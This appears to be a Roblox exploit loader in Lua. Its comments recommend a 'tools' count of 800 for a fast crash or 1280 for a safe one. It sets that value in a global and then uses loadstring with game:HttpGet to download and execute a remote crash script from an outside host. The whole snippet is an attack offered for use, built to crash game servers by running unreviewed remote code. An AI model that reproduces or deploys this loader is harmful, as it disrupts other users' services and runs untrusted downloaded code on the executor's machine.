--try 800 tools (fast crasher but crashes may not function as if )
--1280 tools (safe crash)
getgenv().tools = 1280
loadstring(game:HttpGet('https://martiin.fun/scripts/kantinacrash.lua'))()